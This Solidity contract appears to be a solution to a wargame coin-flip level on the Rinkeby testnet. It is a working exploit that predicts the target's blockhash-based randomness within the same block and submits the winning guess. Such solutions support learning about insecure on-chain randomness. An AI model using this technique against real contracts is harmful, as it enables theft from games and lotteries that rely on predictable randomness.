// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// Writing an interface so function calls get executed in the same block for right predictions
interface ICoinFlip {
// Just one function
function flip(bool _guess) external returns (bool);
function consecutiveWins() external returns(uint256);
}

contract CallFlip {
    // real instance address on rinkeby
    address public _CoinFlipLocation = 0xA23Eb02Deb018304AEe6837Ecf72e15658403186;
    uint256 lastHash;
    uint public i = 0;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function flip() payable external {

        // transaction oriented interface test
        // calculate blockhash of last block like prng of contract
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 division = blockValue / FACTOR;
        console.log("Result of division : %s", division);
        bool side = division == 1 ? true : false;
        // Now call flip and pass side
        ICoinFlip(_CoinFlipLocation).flip(side);
        uint256 wins = ICoinFlip(_CoinFlipLocation).consecutiveWins();
        console.log("Wins after contract guess is: %s", wins);

    }
}